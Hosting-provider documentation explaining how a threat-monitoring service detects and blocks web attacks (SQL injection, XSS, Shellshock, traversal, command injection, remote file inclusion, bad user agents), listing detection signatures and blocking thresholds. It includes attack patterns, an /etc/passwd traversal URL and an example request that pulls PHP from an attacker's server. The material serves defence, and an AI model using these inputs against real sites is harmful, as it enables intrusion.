
# Web Attacks

Web attacks are perhaps one of the most common attacks on Internet facing systems, and they're only becoming more of a danger. UKFast's Threat Monitoring has a range of rules dedicated to detecting and blocking common web based attacks and malicious connection attempts. 

## Web Attacks Threat Monitoring Detects

### SQL Injection

**What is this attack**

Making malicious connections to your database, SQL  attacks are designed to utilize your web applications to run arbitrary SQL queries against your database. As these queries are run by your web application, they can bypass existing security controls and NAC. SQL Injections can take advantage of many different attack vectors, one of the most common is web queries as they tend to sit in close proximity to other services and have privileged access to databases.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

 >  select%20 | select+ | insert%20 | %20from%20 | % 20where%20 | union%20 | union+ | where+ |null,null | xp_cmdshell | +as+varchar | %2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\) | =%27 | select%2B | insert%2B | %2Bfrom%2B | %2Bwhere%2B | %2Bunion%2B | %EF%BC%87 | %EF%BC%87 | %EF%BC%87 | %2531 | %u0053%u0045

MSSQL
> %2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)%2Bchar\(\d+\)

**Severity**

Although dangerous, Threat Monitoring will not immediately block an IP if a SQL injection is detected. This is to prevent more advanced, legitimate web queries from immediately being blocked. If an IP continues to submit SQL injection requests, the IP will be blocked, see the 'Remediations and blocking' section below

**Remediation and Blocking**

Threat Monitoring will block the IP of 8 or more SQL Injection signatures are detected within 120 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

Additionally, If an XSS attack returns a code 200 (Web Request success), Threat Monitoring will check the source IP address against AbuseIPDB. If the IP is known for malicious activity within the last 14 days, the IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.


Attackers will commonly try SQL injections on your site, the best ways to prevent these attacks from being successful are:
* Ensure your database is not directly accessible via the Internet
* Sanitize  your data inputs on any custom built web applications
* Use quality code from trusted sources
* Always update to the latest web application version
* Perform regular database audits


### XSS (Cross Site Scripting)

**What is this attack**

XSS  (Cross Site Scripting) attacks are similar to SQL injections but instead XSS attacks utilize JavaScript run on a user's machine to execute an attack. Through a XSS exploit, an attacker could place malicious JavaScript code on your website that would be ran by every use that visits the web pages affected the the attacker's malicious code. Tis code could steal information or even corrupt what the users seams to the attacker's advantage.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

 >  %3Cscript | %3C%2Fscript | script> | script%3E | SRC=javascript | IMG%20 | %20ONLOAD= | INPUT%20 | iframe%20


**Severity**

Although dangerous, Threat Monitoring will not immediately block an IP if a XSS attack is detected. This is to prevent more advanced, legitimate web queries from immediately being blocked. If an IP continues to submit XSS requests, the IP will be blocked, see the 'Remediations and blocking' section below

**Remediation and Blocking**

Threat Monitoring will block the IP if 10 or more XSS Injection signatures are detected within 120 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

Additionally, If an XSS attack returns a code 200 (Web Request success), Threat Monitoring will check the source IP address against AbuseIPDB. If the IP is known for malicious activity within the last 14 days, the IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.


Attackers will commonly try XSS  injections on your site, the best ways to prevent these attacks from being successful are:

* Sanitize  your data inputs on any custom built web applications
* Use quality code from trusted sources
* Always update to the latest web application version
* Perform regular code audits

### Shellshock Attack (CVE-2014-6271)


**What is this attack**

Taking advantage of web servers, a Shellshock attack has the potential to allow an attacker to arbitrary code on a system. A shellshock attack commonly targets web servers with CGI (Common Gateway Interface) enabled, a system that is used for created dynamic web content. Through a vulnerable CGI, an attacker could send sending malformed or corrupt environment variables to a server's bash terminal, running the attacker's commands.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*
> "\(\)\s*{\s*_;\.*}\s*>_[\$\(\$\(\)\)]\s*{ | "\(\)\s*{\s*:;\s*}\s*; | "\(\)\s*{\s*foo:;\s*}\s*; | "\(\)\s*{\s*ignored;\s*}\s* | "\(\)\s*{\s*gry;\s*}\s*;

**Severity**

Rated 10/10 for severity by NIST (National Institute of Standards and Technology) a shell shock attack certainly has the potential to cause damage. If no action is taken to prevent against this attack, then your server could be left open to a very common and very exploitable attack tat easily allows attackers access to your server.

Threat Monitoring assignees a shellshock attacks level 15 severity.

**Remediation and Blocking**

As this alert is high severity, Threat Monitoring will automatically block the source IP address of any web request that is detected to be attempting a shell shock attack. 

To protect against this vulnerability, you should ensure that your system is up to-date and that preventative measures (like Threat Monitoring) are in place.

Many vulnerability scanners will run a non-malicious shellshock attack against a target system, as a result false positive alerts may to trigger when a ASVs scans your server. 

### Directory Traversal

**What is this attack**

Another common web attack is a directory traversal attack, an exploit that attempts to access files on your server not imminently accessible through a web interface. This attack takes advantage of insecure file permissions and web requests that ave not been sanitized. This exploit could allow an attacker to view the '/etc/passwd' file of your server for example, or access directories contain sensitive information like payment gateway details or credentials.

Directory traversal attacks can be detected by monitoring for web requests that seam to be navigating up to parent directories. For example, if our website is located at /var/www/html, an attacker could utilize this attack to access our /etc/passwd files with https://website.com/../../../../etc/passwd.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

> %027 | %00 | %01 | %7f | %2E%2E | %0A | %0D | ../..|..\.. | echo; | ../..// | %5C../%5C | ././././ \x5C\x5C |

**Severity**

Although dangerous, Threat Monitoring will not immediately block an IP if a Directory Traversal attack is detected. This is to prevent more advanced, legitimate web queries from immediately being blocked. If an IP continues to submit Directory Traversal requests, the IP will be blocked, see the 'Remediations and blocking' section below

**Remediation and Blocking**

Threat Monitoring will block the IP if 10 or more Directory Traversal signatures are detected within 120 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

Additionally, If an Directory Traversal attack returns a code 200 (Web Request success), Threat Monitoring will check the source IP address against AbuseIPDB. If the IP is known for malicious activity within the last 14 days, the IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

### Command Injection

**What is this attack**

Requiring little introduction, this type of attack is then an attacker attempts to run commands on your server through malicious or malformed web requests. This can be especially dangerous if your web server does not properly sanitize inputs, or if your web server runs a privileged user.

For example PHP naively supports a function to execute a string of text as a command on the host system this function, exec, can very useful when creating legitimate code, but it can also be easily exploited to run malicious code if not protected against or properly managed.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

> cmd.exe | root.exe | _mem_bin | msadc | /winnt/ | /boot.ini | /x90/ | default.ida | /sumthin | nsiislog.dll | chmod% |wget% | cd%20 | exec%20

**Severity**

Although dangerous, Threat Monitoring will not immediately block an IP if a Command Injection attack is detected. This is to prevent more advanced, legitimate web queries from immediately being blocked. If an IP continues to submit Command Injection requests, the IP will be blocked, see the 'Remediations and blocking' section below

**Remediation and Blocking**

Threat Monitoring will block the IP if 10 or more Command Injection signatures are detected within 120 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

Additionally, If an Command Injection attack returns a code 200 (Web Request success), Threat Monitoring will check the source IP address against AbuseIPDB. If the IP is known for malicious activity within the last 14 days, the IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

### Remote File Inclusion (RFI)

**What is this attack**

RFI (Remote file inclusion) is a technique used by attackers that take advantage of existing web server capabilities to include an attacker's malicious code that is hosted elsewhere on the Internet. This is exploited by tricking a web server that 'includes' code from other files/variables to instead loading it from an attacker's malicious server.

For example, lets say you have a PHP based web page that includes a header from a secure server in every page, the variable that stores the location of the header file is called 'header'. In your PHP code, you have the below:

``` 
$header = $_GET['https://mysecureserver.com.files/header.php'];

include($header);

``` 

If not properly caught, an attacker could submit a request like this:

`https://yourwebsite.com/?header=http://attackersserver.com/malicouscode.php`

This would overwrite your header variable with their attackers, ans the server would then include the attacker PHP code on your server and then run it.


**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

> \w+?=http | \w+?= \d.\d.\d.\d | \d+?=http | \d+?= \d.\d.\d.\d

**Severity**

Although dangerous, Threat Monitoring will not immediately block an IP if a RFI attack is detected. This is to prevent more advanced, legitimate web queries from immediately being blocked. If an IP continues to submit RFI requests, the IP will be blocked, see the 'Remediations and blocking' section below

**Remediation and Blocking**

Threat Monitoring will block the IP if 10 or more RFI signatures are detected within 120 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

Additionally, If an RFI attack returns a code 200 (Web Request success), Threat Monitoring will check the source IP address against AbuseIPDB. If the IP is known for malicious activity within the last 14 days, the IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

To disable the ability to include remote files completly, you can set `allow_url_include` to `off` in your php.ini or .htaccess file

### POST Bots

**What is this attack**

The Internet is full of bots, both performing tasks that make the Internet run, and sometimes malicious tasks that can cause mayhem. POST requets arebtypes of wen requests that can be sent to a server via HTT and HTTPS and aftre oftern used to send data to a web server or API. 

**Severity**

POST request bots are not specifically dangerous, but detecting them can be a vital way to prevent an upcoming attack, stop a malicious vulnerability scan or stop some web scrapers from submitting request to your site. See the below section for information on blocking this attack.

**Remediation and Blocking**

Threat Monitoring will block the IP if 16 or more POST requests are detected within 20 seconds. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.

### Malicious User Agents

**What is this attack**

Most web based traffic will be accompanied by a user agent tag. This user agent tells that web server what type of device or software it is. For example, the Chrome 60 web browser has a user agent of:

```
 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36
 ```
 
 It looks confusing because, well, it is, but thats for another time :P 
 
 Malicious programs will often also pass their own unique user agent or the more deceptive programs may try to imitate a more common user agent like the above, but accidentally mis-spell some aspects. Threat Monitoring has the ability to detected many of these malicious user agents and block them. See the Remediation and Blocking section below for more information.

**Signatures detected**

Triggered when the URL request contains any of the flowing patterns:

*Patterns are separated by a |*

> "ZmEu" |  "libwww-perl/ | "the beast" | "Morfeus | "ZmEu | "Nikto | "w3af.sourceforge.net | Jorgee" | "Proxy Gear Pro | "DataCha0s

**Severity**

Taking more of a passive approach, this rule does not necessary detect that an attack is in progress, but that a user is using a software/device that is commonly used for attacks. As a result of these, Threat Monitoring classified these as  level 7. IPs that use malicious user agents will be blocked, but an alert will not be sent.

**Remediation and Blocking**

Threat Monitoring will block the IP if a malicious user agent is detected.. The IP will be blocked via IPTables and hosts.deny (Linux) or Windows Firewall for 30 minutes.


## What is Threat Response?

Threat Response is an additional service which provides managed support by our in-house security team, pro-actively looking into all your alerts and applying and remediation as needed. With Threat Response, all your Threat Monitoring alerts will be sent directly to our dedicated team of SOC analysis, with years of industry leading knowledge and experience.

Additionally, our Threat Response team is more than happy to work with you to provide additions tips on how to further secure your servers, with your solutions and needs in mind.

Useful references:

<https://www.w3schools.com/tags/ref_urlencode.asp>

<https://www.owasp.org/index.php/Testing_for_SQL_Injection_(OTG-INPVAL-005)>

<https://www.owasp.org/index.php/Testing_for_Cross_site_scripting>

<https://www.owasp.org/index.php/Testing_Directory_traversal/file_include_(OTG-AUTHZ-001)#How_to_Test>



```eval_rst
.. meta::
     :title: Threat Monitoring and Threat Response | UKFast Documentation
     :description: Guidance relating to UKFast's Threat Monitoring and Threat Response solutions
     :keywords: threat monitoring, security, compliance, ukfast, hosting, file integrity monitoring, rootkit, detection, vulnerability scan, scans, hids, intrusion detection, threat response
```
